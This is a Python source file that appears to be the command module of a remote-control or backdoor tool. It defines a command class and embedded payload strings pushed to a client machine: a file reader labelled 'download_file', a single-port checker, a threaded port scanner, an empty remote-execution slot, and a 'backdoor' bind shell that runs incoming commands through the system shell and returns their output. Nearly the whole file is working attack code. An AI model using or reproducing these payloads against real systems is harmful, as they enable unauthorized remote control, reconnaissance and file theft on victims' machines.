


class command:
    def __init__(self, payload, type, args_to_ask):
        self.payload = bytes(str(payload), 'utf-8')
        self.type = type
        self.args_to_ask = args_to_ask

    def enter_args(self):
        args = []
        for arg_title in self.args_to_ask:
            arg = input( arg_title+"\n")
            args.append(arg)
        self.args = args
        
##################  PAYLOAD FILES ############################
d_payload = """import sys
import os

filepath = sys.argv[1]
f=open(filepath,"r") 
data=f.read()
f.close()
print(data)"""

p_payload = """import socket
import sys
ip, port = sys.argv[1], int(sys.argv[2])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = s.connect_ex((ip, port))
if result == 0:
    print("PORT " +str(port) + " - OPEN")
else:
    print("PORT " +str(port) + " - CLOSED")"""

ce_payload =""""""

# took troj_payload from https://github.com/Metallicode/pythonCourse3.6.5
backdoor_payload = """
import socket
import subprocess
import os
import sys

with socket.socket() as soc:
      soc.bind((sys.argv[1], int(sys.argv[2]))) 
      soc.listen()
      client, address = soc.accept() 
      command = ""
      while command != "q":
            command = client.recv(256).decode() #get command from client 
            if command[:2]=="cd" and len(command)>2: #if command was 'cd xxxx' use os.chdir(path)
                  os.chdir(command[3:]) #change dir
                  client.send(os.getcwd().encode()) #return new dir path
                  continue # no sub process this time

            
            process = subprocess.run(command, shell=True ,stdout=subprocess.PIPE, stderr=subprocess.PIPE) #run command on shell
            client.send(process.stdout) #send stdout to server"""

## took ports_payload from https://github.com/Metallicode/pythonCourse3.6.5/
ports_payload = """
import socket
import threading
import sys

results ={}

#thread worker
def worker(port, ip):
      soc = socket.socket()
      soc.settimeout(0.5)
      if soc.connect_ex((ip, port))==0:
            results[port]=soc.recv(84).decode()
      soc.close()


ip = sys.argv[1]

#run on 0-999 for port numbers
for i in range(1000):
      t = threading.Thread(target=worker, args=(i, ip))
      t.start()


for key in results:
    print(f"port {key}\t\t {results[key]}")"""

##############################################################



##########    PAYLOAD ARGS TO ENTER BY USER   #################
d_args      = ['enter filepath:', 'enter filename']
p_args      = ["check single port:"]
ce_args     = ["enter single exe command:"]
bs_args     = ["enter port to take control over client's shell:"]
###############################################################



download_file   = command(payload=d_payload, type='download_file', args_to_ask=d_args)
ports_scan      = command(payload=ports_payload, type='ports_scan', args_to_ask=[])
one_port_scan   = command(payload=p_payload, type='one_port_scan', args_to_ask=p_args)
cmd_exe         = command(payload=ce_payload, type='cmd_exe', args_to_ask=ce_args)
backdoor_shell      = command(payload=backdoor_payload, type='take_shell', args_to_ask=bs_args)

commands_list  = [download_file, ports_scan, one_port_scan, cmd_exe, backdoor_shell]







